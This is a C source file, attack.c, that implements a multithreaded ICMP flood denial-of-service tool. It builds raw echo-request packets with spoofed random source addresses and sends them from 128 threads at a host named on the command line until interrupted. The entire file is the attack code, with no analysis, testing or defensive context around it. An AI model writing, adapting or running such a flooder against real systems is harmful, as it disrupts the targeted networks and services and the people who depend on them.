/*************************************************************************
	> File Name: attack.c
	> Author: yuxintao
	> Mail: 1921056015@qq.com 
	> Created Time: 2022年03月09日 星期三 10时41分53秒
 ************************************************************************/

#include <stdio.h>
#include <stdlib.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <signal.h>
#include <unistd.h>
#include <string.h>
#include <pthread.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <netdb.h>
#define MAXCHILD 128
static inline unsigned int myrandom(int begin, int end);
static void* Dos_fun(void* argv);
static void Dos_icmp();

static unsigned int dest;
static int PROTO_ICMP;
static int alive;
static int rawsock;

static inline unsigned int myrandom(int begin, int end) {
	int gap = end - begin + 1;
	int ret = 0;
	srand((unsigned)time(NULL));
	ret = random() % gap + begin;
	return ret;
}

static void* Dos_fun(void* argv) {
	while (alive) {
		Dos_icmp();
	}
}

static void Dos_icmp() {
	struct sockaddr_in to;
	struct ip* iph;
	struct icmp* icmph;
	char *packet;
	int pktsize = sizeof(struct ip) + sizeof(struct icmp) + 64;
	packet = (char*)malloc(pktsize);
	memset(packet, 0, pktsize);
	iph = (struct ip*)packet;
	icmph = (struct icmp*)(packet + sizeof(struct ip));
	
	iph->ip_v = 4;
	iph->ip_hl = 5;
	iph->ip_tos = 0;
	iph->ip_len = htons(pktsize);
	iph->ip_id = htons(getpid());
	iph->ip_off = 0;
	iph->ip_ttl = 0x0;
	iph->ip_p = PROTO_ICMP;
	iph->ip_sum = 0;
	iph->ip_src.s_addr = (unsigned int)myrandom(0, 65535);
	iph->ip_dst.s_addr = dest;

	icmph->icmp_type = ICMP_ECHO;
	icmph->icmp_code = 0;
	icmph->icmp_cksum = htons(~(ICMP_ECHO) << 8);

	to.sin_family = AF_INET;
	to.sin_addr.s_addr = iph->ip_dst.s_addr;
	to.sin_port = 0;

	sendto(rawsock, packet, pktsize, 0, (struct sockaddr*)&to, sizeof(struct sockaddr));
	free(packet);
}

static void Dos_sig(int sign)
{
	alive = 0;
}

int main(int argc, char** argv) {
	if (argc < 2)
		return -1;
	signal(SIGINT, Dos_sig);
	struct hostent* host = NULL;
	alive = 1;
	dest = inet_addr(argv[1]);
	if (dest == INADDR_NONE) {
		host = gethostbyname(argv[1]);
		if (host == NULL) {
			perror("gethostbyname");
			return -1;
		}
		memcpy((char*)&dest, host->h_addr, host->h_length);
	}


	//create socket
	struct protoent* protocol = NULL;
	char protoname[] = "icmp";
	protocol = getprotobyname(protoname);
	if (protocol == NULL) {
		perror("getprotobyname");
		return -1;
	}
	PROTO_ICMP = protocol->p_proto;
	rawsock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
	if (rawsock < 0)
		rawsock = socket(AF_INET, SOCK_RAW, PROTO_ICMP);
	setsockopt(rawsock, SOL_IP, IP_HDRINCL, "1", sizeof("1"));
	//start thread
	int i;
	pthread_t pthread[MAXCHILD];
	for (i = 0; i < MAXCHILD; ++i) 
		pthread_create(&pthread[i], NULL, Dos_fun, NULL);

	for (i = 0; i < MAXCHILD; ++i)
		pthread_join(pthread[i], NULL);
	//close socket
	close(rawsock);
	return 0;
}
